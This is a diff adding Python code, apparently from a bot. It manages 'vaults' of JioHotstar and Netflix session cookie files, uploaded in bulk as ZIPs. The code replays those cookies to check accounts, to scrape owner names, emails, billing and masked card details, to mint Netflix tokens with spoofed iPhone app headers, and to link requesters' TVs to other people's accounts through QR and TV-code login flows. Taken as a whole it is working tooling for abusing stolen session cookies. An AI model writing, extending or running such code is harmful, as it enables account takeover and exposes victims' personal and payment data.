@@ -1,0 +1,1140 @@
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║              JIOHOTSTAR VAULT (QR TV LOGIN)                             ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+def hs_vault_load_usage() -> dict:
+    try:
+        with open(HS_VAULT_USAGE_FILE, "r") as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+def hs_vault_save_usage(usage: dict):
+    with open(HS_VAULT_USAGE_FILE, "w") as f:
+        json.dump(usage, f, indent=2)
+
+def hs_vault_get_use_count(filename: str) -> int:
+    return hs_vault_load_usage().get(filename, 0)
+
+def hs_vault_increment_use(filename: str) -> int:
+    usage = hs_vault_load_usage()
+    usage[filename] = usage.get(filename, 0) + 1
+    hs_vault_save_usage(usage)
+    return usage[filename]
+
+def hs_vault_load_stats() -> dict:
+    try:
+        with open(HS_VAULT_STATS_FILE, "r") as f:
+            return json.load(f)
+    except Exception:
+        return {"total": 0, "success": 0, "failed": 0, "last": None}
+
+def hs_vault_save_stats(stats: dict):
+    with open(HS_VAULT_STATS_FILE, "w") as f:
+        json.dump(stats, f, indent=2)
+
+def hs_vault_record(success: bool):
+    s = hs_vault_load_stats()
+    s["total"]  += 1
+    s["success" if success else "failed"] += 1
+    s["last"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    hs_vault_save_stats(s)
+
+def hs_vault_count() -> int:
+    return len(glob.glob(os.path.join(HS_VAULT_DIR, "*.txt")))
+
+def hs_vault_available_count() -> int:
+    usage = hs_vault_load_usage()
+    return sum(
+        1 for fp in glob.glob(os.path.join(HS_VAULT_DIR, "*.txt"))
+        if usage.get(os.path.basename(fp), 0) < HS_VAULT_MAX_USES
+    )
+
+def hs_vault_parse_cookie_file(filepath: str) -> dict:
+    cookies = {}
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read()
+
+        for line in content.splitlines():
+            line = line.strip()
+            if not line:
+                continue
+            if line.startswith("#HttpOnly_"):
+                line = line[len("#HttpOnly_"):]
+            elif line.startswith("#"):
+                continue
+            parts = line.split("\t")
+            if len(parts) >= 7:
+                cookies[parts[5]] = parts[6]
+
+        if not cookies.get("sessionUserUP"):
+            text = content.strip()
+            if text.startswith(("{", "[")):
+                try:
+                    obj = json.loads(text)
+                    if isinstance(obj, dict):
+                        cookies.update({k: str(v) for k, v in obj.items() if v})
+                        if "cookies" in obj and isinstance(obj["cookies"], list):
+                            for c in obj["cookies"]:
+                                if isinstance(c, dict) and c.get("name") and c.get("value"):
+                                    cookies[c["name"]] = str(c["value"])
+                    elif isinstance(obj, list):
+                        for c in obj:
+                            if isinstance(c, dict) and c.get("name") and c.get("value"):
+                                cookies[c["name"]] = str(c["value"])
+                except Exception:
+                    pass
+
+        if not cookies.get("sessionUserUP"):
+            for line in content.splitlines():
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                if ";" in line and "=" in line:
+                    for part in line.split(";"):
+                        part = part.strip()
+                        if "=" in part:
+                            k, _, v = part.partition("=")
+                            cookies[k.strip()] = v.strip()
+                    if cookies.get("sessionUserUP"):
+                        break
+
+        if not cookies.get("sessionUserUP"):
+            for line in content.splitlines():
+                line = line.strip()
+                if "=" in line and not line.startswith("#"):
+                    k, _, v = line.partition("=")
+                    cookies[k.strip()] = v.strip()
+
+    except Exception:
+        pass
+
+    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items() if k and v)
+    return {
+        "cookie_dict": cookies,
+        "cookie_str":  cookie_str,
+        "token":       cookies.get("sessionUserUP") or cookies.get("userUP") or "",
+        "device_id":   cookies.get("deviceId") or "",
+    }
+
+def hs_vault_pick_cookie() -> tuple:
+    files = glob.glob(os.path.join(HS_VAULT_DIR, "*.txt"))
+    if not files:
+        return None, "No cookie files in vault."
+    usage = hs_vault_load_usage()
+    available = [fp for fp in files if usage.get(os.path.basename(fp), 0) < HS_VAULT_MAX_USES]
+    if not available:
+        return None, f"All vault cookies reached max uses ({HS_VAULT_MAX_USES}). Upload more."
+    import random as _rnd
+    _rnd.shuffle(available)
+    fp = available[0]
+    info = hs_vault_parse_cookie_file(fp)
+    info["filepath"] = fp
+    info["filename"] = os.path.basename(fp)
+    return info, None
+
+def scan_qr(image_bytes: bytes) -> Optional[str]:
+    if _PYZBAR_OK:
+        try:
+            nparr = np.frombuffer(image_bytes, np.uint8)
+            img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+            if img is not None:
+                decoded = pyzbar_decode(img)
+                if not decoded:
+                    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+                    _, thresh1 = cv2.threshold(gray, 127, 255, cv2.THRESH_BINARY)
+                    decoded = pyzbar_decode(thresh1)
+                if not decoded:
+                    thresh2 = cv2.adaptiveThreshold(
+                        gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2
+                    )
+                    decoded = pyzbar_decode(thresh2)
+                if decoded:
+                    return decoded[0].data.decode("utf-8")
+        except Exception as e:
+            logger.warning(f"Local QR scan error: {e}")
+
+    try:
+        resp = requests.post(
+            "https://api.qrserver.com/v1/read-qr-code/",
+            files={"file": ("qr.jpg", io.BytesIO(image_bytes), "image/jpeg")},
+            timeout=15,
+        )
+        if resp.status_code == 200:
+            data = resp.json()
+            qr_text = data[0]["symbol"][0]["data"]
+            if qr_text:
+                return qr_text
+    except Exception as e:
+        logger.warning(f"API QR scan error: {e}")
+
+    return None
+
+
+def hs_vault_activate_qr(qr_url: str, cookie_info: dict) -> tuple:
+    import urllib.parse as _up
+
+    cookie_str  = cookie_info.get("cookie_str", "")
+    cookie_dict = cookie_info.get("cookie_dict", {})
+    if not cookie_dict:
+        for part in cookie_str.split(";"):
+            part = part.strip()
+            if "=" in part:
+                k, _, v = part.partition("=")
+                cookie_dict[k.strip()] = v.strip()
+
+    user_token = cookie_info.get("token") or cookie_dict.get("sessionUserUP") or cookie_dict.get("userUP", "")
+    device_id  = cookie_info.get("device_id") or cookie_dict.get("deviceId", "")
+
+    qr_param = ""
+    try:
+        parsed   = _up.urlparse(qr_url)
+        qr_param = _up.parse_qs(parsed.query).get("qr_code", [""])[0]
+    except Exception:
+        pass
+
+    MOBILE_UA = (
+        "Mozilla/5.0 (Linux; Android 10; K) "
+        "AppleWebKit/537.36 (KHTML, like Gecko) "
+        "Chrome/137.0.0.0 Mobile Safari/537.36"
+    )
+
+    try:
+        scraper = cloudscraper.create_scraper()
+        headers = {
+            "authority":                 "www.hotstar.com",
+            "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+            "accept-language":           "en-MM,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cookie":                    cookie_str,
+            "sec-ch-ua":                 '"Chromium";v="137", "Not/A)Brand";v="24"',
+            "sec-ch-ua-mobile":          "?1",
+            "sec-ch-ua-platform":        '"Android"',
+            "sec-fetch-dest":            "document",
+            "sec-fetch-mode":            "navigate",
+            "sec-fetch-site":            "none",
+            "upgrade-insecure-requests": "1",
+            "user-agent":                MOBILE_UA,
+        }
+        if user_token and "userUP=" not in cookie_str:
+            headers["cookie"] += f"; userUP={user_token}"
+
+        resp      = scraper.get(qr_url, headers=headers, timeout=30, allow_redirects=True)
+        status    = resp.status_code
+        body      = resp.text.lower()
+        final_url = resp.url
+
+        _SUCCESS = ["success", "activated", "tv linked", "device linked",
+                    "signin complete", "already logged", "already signed",
+                    "watch", "home"]
+        _FAIL    = ["expired", "invalid", "unauthorized", "forbidden", "not found"]
+
+        for kw in _SUCCESS:
+            if kw in body:
+                return True, f"✅ Activated (HTTP {status})"
+
+        redirected_ok = ("tv-login" not in final_url.lower() and
+                         "tv-signin" not in final_url.lower() and
+                         "login" not in final_url.lower())
+        if status in (301, 302) or (status == 200 and redirected_ok):
+            return True, f"✅ Activated (HTTP {status})"
+
+        for kw in _FAIL:
+            if kw in body:
+                break
+        else:
+            if status == 200:
+                return True, "✅ Request completed — check your TV."
+
+    except Exception as e_a:
+        e_a_str = str(e_a)[:120]
+    else:
+        e_a_str = None
+
+    if user_token and qr_param:
+        try:
+            api_headers = {
+                "User-Agent":      MOBILE_UA,
+                "Accept":          "application/json, text/plain, */*",
+                "Accept-Language": "en-IN,en;q=0.9",
+                "Content-Type":    "application/json",
+                "X-HS-UserToken":  user_token,
+                "X-HS-AppId":      "hotstar.com",
+                "X-Country-Code":  "IN",
+                "X-Platform":      "web",
+                "Referer":         "https://www.hotstar.com/",
+                "Origin":          "https://www.hotstar.com",
+            }
+            if device_id:
+                api_headers["X-HS-DeviceId"] = device_id
+
+            api_resp = requests.post(
+                "https://api.hotstar.com/in/aor/v2/partner/tv/login",
+                json={"qrCode": qr_param},
+                headers=api_headers, timeout=20, verify=False,
+            )
+            abody = api_resp.text.lower()
+            for kw in ["success", "activated", "tv linked", "signin complete"]:
+                if kw in abody:
+                    return True, f"✅ API activated (HTTP {api_resp.status_code})"
+            if api_resp.status_code in (200, 201, 204):
+                for kw in ["expired", "invalid", "unauthorized", "forbidden"]:
+                    if kw in abody:
+                        break
+                else:
+                    return True, f"✅ API accepted (HTTP {api_resp.status_code})"
+            return False, f"API: HTTP {api_resp.status_code} — {api_resp.text[:100]}"
+        except Exception as e_b:
+            return False, (f"Method A: {e_a_str or 'no match'} | "
+                           f"Method B: {str(e_b)[:80]}")
+
+    if e_a_str is None:
+        return True, "✅ Request sent (HTTP 200) — check your TV."
+    return False, f"Activation failed: {e_a_str}"
+
+def hs_vault_add_zip(zip_path: str) -> tuple:
+    tmp_dir = zip_path + "_extract"
+    try:
+        os.makedirs(tmp_dir, exist_ok=True)
+        with zipfile.ZipFile(zip_path, "r") as zf:
+            zf.extractall(tmp_dir)
+        txts = (glob.glob(os.path.join(tmp_dir, "**", "*.txt"),  recursive=True) +
+                glob.glob(os.path.join(tmp_dir, "**", "*.json"), recursive=True))
+        if not txts:
+            return 0, "No .txt/.json files found in ZIP."
+        added = 0
+        for src in txts:
+            fname = os.path.basename(src)
+            dest  = os.path.join(HS_VAULT_DIR, fname)
+            if os.path.exists(dest):
+                base, ext = os.path.splitext(fname)
+                dest = os.path.join(HS_VAULT_DIR, f"{base}_{int(time.time())}{ext}")
+            shutil.move(src, dest)
+            added += 1
+        return added, None
+    except Exception as e:
+        return 0, str(e)[:120]
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    NETFLIX CHECKER & MULTI-TOOL                         ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+NF_COOKIE_NAMES = {
+    "NetflixId", "SecureNetflixId", "nfvdid",
+    "OptanonConsent", "flwssn", "memclid",
+    "profilesNewSession", "clSharedContext",
+}
+
+NF_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+         "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
+
+NF_TOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+NF_TOKEN_PARAMS  = {
+    "appVersion":    "15.48.1",
+    "config":        '{"billboardEnabled":"true","contentWarningEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","sharksEnabled":"true"}',
+    "device_type":   "NFAPPL-02-",
+    "esn":           "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "idiom":         "phone",
+    "iosVersion":    "15.8.5",
+    "isTablet":      "false",
+    "languages":     "en-US",
+    "locale":        "en-US",
+    "maxDeviceWidth":"375",
+    "model":         "saget",
+    "modelType":     "IPHONE8-1",
+    "odpAware":      "true",
+    "path":          '["account","token","default"]',
+    "pathFormat":    "graph",
+    "pixelDensity":  "2.0",
+    "progressive":   "false",
+    "responseFormat":"json",
+}
+NF_TOKEN_HEADERS = {
+    "User-Agent":                          "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+    "x-netflix.request.attempt":           "1",
+    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+    "x-netflix.context.profile-guid":     "A4CS633D7VCBPE2GPK2HL4EKOE",
+    "x-netflix.request.routing":          '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
+    "x-netflix.context.app-version":      "15.48.1",
+    "x-netflix.argo.translated":          "true",
+    "x-netflix.context.form-factor":      "phone",
+    "x-netflix.context.sdk-version":      "2012.4",
+    "x-netflix.client.appversion":        "15.48.1",
+    "x-netflix.context.max-device-width": "375",
+    "x-netflix.context.ab-tests":         "",
+    "x-netflix.tracing.cl.useractionid":  "4DC655F2-9C3C-4343-8229-CA1B003C3053",
+    "x-netflix.client.type":              "argo",
+    "x-netflix.client.ftl.esn":           "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "x-netflix.context.locales":          "en-US",
+    "x-netflix.context.top-level-uuid":   "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+    "x-netflix.client.iosversion":        "15.8.5",
+    "accept-language":                    "en-US;q=1",
+    "x-netflix.argo.abtests":             "",
+    "x-netflix.context.os-version":       "15.8.5",
+    "x-netflix.request.client.context":   '{"appState":"foreground"}',
+    "x-netflix.context.ui-flavor":        "argo",
+    "x-netflix.argo.nfnsm":              "9",
+    "x-netflix.context.pixel-density":    "2.0",
+    "x-netflix.request.toplevel.uuid":    "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+    "x-netflix.request.client.timezoneid":"Asia/Dhaka",
+}
+
+DIV_NF = "═" * 27
+
+
+def nf_canonicalize(name: str) -> str:
+    _map = {n.lower(): n for n in NF_COOKIE_NAMES}
+    return _map.get(str(name or "").strip().lower(), str(name or "").strip())
+
+
+def nf_parse_cookie_file(text: str) -> list:
+    text    = text.strip()
+    results = []
+
+    try:
+        if text.startswith(("{", "[")):
+            obj = json.loads(text)
+            if isinstance(obj, dict):
+                cd = {k: str(v) for k, v in obj.items() if k in NF_COOKIE_NAMES}
+                if cd.get("NetflixId"):
+                    results.append(("json_flat", cd))
+                if "cookies" in obj and isinstance(obj["cookies"], list):
+                    merged = {}
+                    for c in obj["cookies"]:
+                        if isinstance(c, dict) and c.get("name") in NF_COOKIE_NAMES:
+                            merged[c["name"]] = str(c.get("value", ""))
+                    if merged.get("NetflixId"):
+                        results.append(("json_nested", merged))
+            elif isinstance(obj, list):
+                merged = {}
+                for c in obj:
+                    if isinstance(c, dict):
+                        n = c.get("name") or c.get("key")
+                        v = c.get("value")
+                        if n and v and n in NF_COOKIE_NAMES:
+                            merged[n] = v
+                if merged.get("NetflixId"):
+                    results.append(("json_list", merged))
+    except Exception:
+        pass
+
+    ns = []
+    for line in text.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        if line.startswith("#HttpOnly_"):
+            line = line[len("#HttpOnly_"):]
+        elif line.startswith("#"):
+            continue
+        parts = line.split("\t")
+        if len(parts) >= 7:
+            n = nf_canonicalize(parts[5])
+            if n in NF_COOKIE_NAMES:
+                ns.append({"name": n, "value": parts[6]})
+    if ns:
+        ids = [e for e in ns if e["name"] == "NetflixId"]
+        for i, nf in enumerate(ids):
+            cd = {"NetflixId": nf["value"]}
+            for e in ns:
+                if e["name"] != "NetflixId":
+                    cd[e["name"]] = e["value"]
+            results.append((f"netscape_{i}", cd))
+        if not ids:
+            results.append(("netscape_all", {e["name"]: e["value"] for e in ns}))
+
+    for line in text.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        sc = {}
+        for part in line.split(";"):
+            part = part.strip()
+            if "=" in part:
+                k, _, v = part.partition("=")
+                k = nf_canonicalize(k.strip())
+                if k in NF_COOKIE_NAMES:
+                    sc[k] = v.strip()
+        if sc.get("NetflixId"):
+            results.append((f"semi_{len(results)}", sc))
+
+    kv = {}
+    for line in text.splitlines():
+        line = line.strip()
+        if "=" in line and not line.startswith("#"):
+            k, _, v = line.partition("=")
+            k = nf_canonicalize(k.strip())
+            if k in NF_COOKIE_NAMES:
+                kv[k] = v.strip()
+    if kv.get("NetflixId"):
+        results.append(("keyvalue", kv))
+
+    for m in re.finditer(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', text, re.IGNORECASE):
+        nf_val = m.group(1).strip("\"'")
+        cd = {"NetflixId": nf_val}
+        for cn in NF_COOKIE_NAMES - {"NetflixId"}:
+            rm = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE)
+            if rm:
+                cd[cn] = rm.group(1).strip("\"'")
+        results.append((f"regex_{len(results)}", cd))
+
+    seen, deduped = set(), []
+    for bn, cd in results:
+        nfid = cd.get("NetflixId", "")
+        if nfid and nfid not in seen:
+            seen.add(nfid)
+            deduped.append((bn, cd))
+    return deduped
+
+
+def nf_safe(text) -> str:
+    if not text:
+        return "Unknown"
+    text = str(text)
+    text = re.sub(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})',
+                  lambda m: f"{m.group(1)}***{m.group(2)}", text)
+    text = re.sub(r'(\+?\d{2})\d{2,}(\d{2})', lambda m: f"{m.group(1)}***{m.group(2)}", text)
+    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+
+def nf_check_one(cookie_dict: dict) -> dict:
+    if not cookie_dict.get("NetflixId"):
+        return {"status": "DEAD", "reason": "No NetflixId", "cookie": cookie_dict, "content": ""}
+    session = requests.Session()
+    session.cookies.update(cookie_dict)
+    headers = {
+        "User-Agent":      NF_UA,
+        "Accept":          "text/html,application/xhtml+xml",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate",
+    }
+    try:
+        resp, txt = None, ""
+        for url in ["https://www.netflix.com/YourAccount", "https://www.netflix.com/account"]:
+            try:
+                r = session.get(url, headers=headers, timeout=25, allow_redirects=True)
+                if r.status_code == 200 and "Account" in r.text:
+                    resp, txt = r, r.text
+                    break
+            except Exception:
+                continue
+        if not resp or resp.status_code != 200:
+            return {"status": "DEAD", "reason": f"HTTP {resp.status_code if resp else 'error'}",
+                    "cookie": cookie_dict, "content": ""}
+        if "login" in resp.url.lower() or "signin" in resp.url.lower():
+            return {"status": "DEAD", "reason": "Redirected to login", "cookie": cookie_dict, "content": ""}
+
+        def find(pat):
+            m = re.search(pat, txt)
+            return nf_safe(m.group(1)) if m else None
+
+        name         = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
+        plan_raw     = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
+        country      = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
+        email        = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"loginId"\s*:\s*"([^"]+)"')
+        member_since = find(r'"memberSince":"([^"]+)"')
+        next_billing = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
+        plan_price   = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
+        payment      = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
+        card         = find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"')
+        quality      = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
+        streams      = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
+        extra        = "Yes" if re.search(r'"showExtraMemberSection".*?true', txt) else "No"
+        email_ver    = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
+        guid         = find(r'"userGuid":\s*"([^"]+)"')
+        ms_m         = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
+        ms           = ms_m.group(1) if ms_m else None
+        is_prem      = (ms == "CURRENT_MEMBER") if ms else bool(plan_raw and "free" not in str(plan_raw).lower())
+        has_data     = any([name, email, country, plan_raw, ms, guid])
+        if not has_data:
+            return {"status": "DEAD", "reason": "No account data found",
+                    "cookie": cookie_dict, "content": ""}
+
+        profiles_str = None
+        try:
+            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=12)
+            if rp.status_code == 200:
+                profs = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text)
+                if not profs:
+                    profs = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text)
+                if profs:
+                    profiles_str = ", ".join(nf_safe(p) for p in profs)
+        except Exception:
+            pass
+
+        expiry = int(time.time()) + 180 * 24 * 3600
+        ns = ["# Netscape HTTP Cookie File"]
+        for k, v in cookie_dict.items():
+            secure = "TRUE" if k == "SecureNetflixId" else "FALSE"
+            ns.append(f".netflix.com\tTRUE\t/\t{secure}\t{expiry}\t{k}\t{v}")
+
+        return {
+            "status":           "PREMIUM" if is_prem else "FREE",
+            "name":             name or "Unknown",
+            "email":            email or "Unknown",
+            "country":          country or "Unknown",
+            "plan":             plan_raw or "Unknown",
+            "plan_price":       plan_price or "Unknown",
+            "member_since":     member_since or "Unknown",
+            "next_billing":     next_billing or "Unknown",
+            "payment_method":   payment or "Unknown",
+            "masked_card":      card or "Unknown",
+            "quality":          quality or "Unknown",
+            "streams":          streams or "Unknown",
+            "extra_member":     extra,
+            "email_verified":   email_ver,
+            "membership_status":ms or "Unknown",
+            "profiles":         profiles_str or "Unknown",
+            "guid":             guid or "Unknown",
+            "cookie":           cookie_dict,
+            "content":          "\n".join(ns),
+        }
+    except Exception as e:
+        return {"status": "DEAD", "reason": str(e)[:80], "cookie": cookie_dict, "content": ""}
+
+
+def nf_generate_token(cookie_dict: dict) -> dict:
+    nfid = cookie_dict.get("NetflixId")
+    if not nfid:
+        return {"status": "DEAD", "reason": "No NetflixId"}
+    headers = dict(NF_TOKEN_HEADERS)
+    headers["Cookie"] = f"NetflixId={nfid}"
+    try:
+        r = requests.get(NF_TOKEN_API_URL, params=NF_TOKEN_PARAMS,
+                         headers=headers, timeout=20, verify=False)
+        r.raise_for_status()
+        data   = r.json()
+        td     = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
+        token  = td.get("token")
+        expiry = td.get("expires")
+        if not token:
+            return {"status": "DEAD", "reason": "Dead cookie"}
+        if isinstance(expiry, int) and len(str(expiry)) == 13:
+            expiry //= 1000
+        exp_str = datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M:%S") if expiry else "Unknown"
+        return {"status": "TOKEN", "token": token, "expires": exp_str, "cookie": cookie_dict}
+    except Exception as e:
+        return {"status": "DEAD", "reason": str(e)[:80]}
+
+
+def nf_check_file(fp: str, sub: str) -> dict:
+    try:
+        with open(fp, "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read()
+        parsed = nf_parse_cookie_file(content)
+        if not parsed:
+            return {"status": "DEAD", "reason": "No Netflix cookies found",
+                    "filename": os.path.basename(fp), "content": ""}
+        _, cd = parsed[0]
+        result = nf_generate_token(cd) if sub == "nftoken" else nf_check_one(cd)
+        result.setdefault("filename", os.path.basename(fp))
+        result.setdefault("content", "")
+        return result
+    except Exception as e:
+        return {"status": "DEAD", "reason": str(e)[:80],
+                "filename": os.path.basename(fp), "content": ""}
+
+
+def nf_vault_count() -> int:
+    return len(glob.glob(os.path.join(NF_VAULT_DIR, "*.txt")) +
+               glob.glob(os.path.join(NF_VAULT_DIR, "*.json")))
+
+
+def nf_vault_pick_and_consume() -> tuple:
+    import random as _rnd
+    files = (glob.glob(os.path.join(NF_VAULT_DIR, "*.txt")) +
+             glob.glob(os.path.join(NF_VAULT_DIR, "*.json")))
+    if not files:
+        return None, "No cookies in vault"
+    _rnd.shuffle(files)
+    for fp in files:
+        try:
+            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
+                content = f.read()
+            parsed = nf_parse_cookie_file(content)
+            if not parsed:
+                os.remove(fp)
+                continue
+            _, cd = parsed[0]
+            if not cd.get("NetflixId"):
+                os.remove(fp)
+                continue
+            fname = os.path.basename(fp)
+            os.remove(fp)
+            return cd, fname
+        except Exception:
+            continue
+    return None, "All vault cookies invalid or empty"
+
+
+def nf_vault_add_zip(zip_path: str) -> tuple:
+    tmp_dir = zip_path + "_nf_extr"
+    try:
+        os.makedirs(tmp_dir, exist_ok=True)
+        with zipfile.ZipFile(zip_path, "r") as zf:
+            zf.extractall(tmp_dir)
+        files = (glob.glob(os.path.join(tmp_dir, "**", "*.txt"),  recursive=True) +
+                 glob.glob(os.path.join(tmp_dir, "**", "*.json"), recursive=True))
+        if not files:
+            return 0, "No .txt/.json files found in ZIP."
+        added = 0
+        for src in files:
+            fname = os.path.basename(src)
+            dest  = os.path.join(NF_VAULT_DIR, fname)
+            if os.path.exists(dest):
+                base, ext = os.path.splitext(fname)
+                dest = os.path.join(NF_VAULT_DIR, f"{base}_{int(time.time())}{ext}")
+            shutil.move(src, dest)
+            added += 1
+        return added, None
+    except Exception as e:
+        return 0, str(e)[:120]
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+
+def nf_extract_auth_url(html_text: str) -> Optional[str]:
+    import urllib.parse as _up
+    for pat in [r'name="authURL"\s+value="([^"]+)"',
+                r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
+                r'value="(c1\.[^"]+)"']:
+        m = re.search(pat, html_text)
+        if m:
+            return _up.unquote(m.group(1))
+    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
+    return m.group(0) if m else None
+
+
+def nf_submit_tv_code(session, tv_code: str) -> dict:
+    headers = {
+        "User-Agent":      NF_UA,
+        "Accept":          "text/html,application/xhtml+xml",
+        "Accept-Language": "en-US,en;q=0.9",
+    }
+    try:
+        r = session.get("https://www.netflix.com/tv8", headers=headers,
+                        timeout=REQUEST_TIMEOUT, verify=False)
+        if r.status_code != 200:
+            return {"success": False, "error": f"TV page HTTP {r.status_code}"}
+    except Exception as e:
+        return {"success": False, "error": f"Connection failed: {str(e)[:60]}"}
+    auth_url = nf_extract_auth_url(r.text)
+    if not auth_url:
+        return {"success": False, "error": "Could not load activation page (no authURL)"}
+    form = {
+        "flow":                    "websiteSignUp",
+        "authURL":                 auth_url,
+        "flowMode":                "enterTvLoginRendezvousCode",
+        "withFields":              "tvLoginRendezvousCode,isTvUrl2",
+        "code":                    tv_code,
+        "tvLoginRendezvousCode":   tv_code,
+        "action":                  "nextAction",
+    }
+    post_h = {**headers,
+              "Content-Type": "application/x-www-form-urlencoded",
+              "Referer": "https://www.netflix.com/tv8",
+              "Origin":  "https://www.netflix.com"}
+    try:
+        r = session.post("https://www.netflix.com/tv8", data=form, headers=post_h,
+                         timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
+    except Exception as e:
+        return {"success": False, "error": f"Activation request failed: {str(e)[:60]}"}
+    final_url  = r.url
+    text_clean = re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', r.text)).strip().lower()
+    if "/tv/out/success" in final_url.lower() or ("success" in final_url.lower() and "tv" in final_url.lower()):
+        return {"success": True, "error": None}
+    for pat in [r"your tv is ready", r"successfully activated", r"t[ée]l[ée]vision activ[ée]"]:
+        if re.search(pat, text_clean):
+            return {"success": True, "error": None}
+    for pat in [r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong|expired)", r"try again"]:
+        if re.search(pat, text_clean):
+            return {"success": False, "error": "Invalid or expired TV code"}
+    if "/tv/" in final_url.lower() and "code" not in final_url.lower():
+        return {"success": True, "error": None}
+    return {"success": False, "error": "Unknown response from Netflix"}
+
+
+def nf_process_tv_login(tv_code: str) -> dict:
+    tried, countries = 0, []
+    while True:
+        cd, info = nf_vault_pick_and_consume()
+        if cd is None:
+            return {"success": False,
+                    "error": "no_cookies_left" if tried == 0 else "all_cookies_failed",
+                    "tried": tried, "countries": countries}
+        tried += 1
+        session = requests.Session()
+        session.cookies.update(cd)
+        headers = {"User-Agent": NF_UA, "Accept": "text/html,application/xhtml+xml"}
+        try:
+            r = session.get("https://www.netflix.com/YourAccount", headers=headers,
+                            timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
+            if "login" in r.url.lower() or r.status_code != 200:
+                continue
+            country_m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
+            plan_m    = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text)
+            country   = country_m.group(1) if country_m else None
+            plan      = plan_m.group(1) if plan_m else "Unknown"
+            if not country:
+                continue
+            countries.append(country)
+        except Exception:
+            continue
+        result = nf_submit_tv_code(session, tv_code)
+        result["country"] = country
+        result["plan"]    = plan
+        result["tried"]   = tried
+        result["countries"] = countries
+        if result["success"]:
+            return result
+        if "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
+            return result
+
+
+def nf_clean_cookies_to_zip(content: str) -> tuple:
+    parsed = nf_parse_cookie_file(content)
+    if not parsed:
+        return None, 0
+    expiry = int(time.time()) + 180 * 24 * 3600
+    buf, valid = io.BytesIO(), 0
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        for idx, (_, cd) in enumerate(parsed, 1):
+            if cd.get("NetflixId"):
+                valid += 1
+                lines = ["# Netscape HTTP Cookie File"]
+                for k, v in cd.items():
+                    secure = "TRUE" if k == "SecureNetflixId" else "FALSE"
+                    lines.append(f".netflix.com\tTRUE\t/\t{secure}\t{expiry}\t{k}\t{v}")
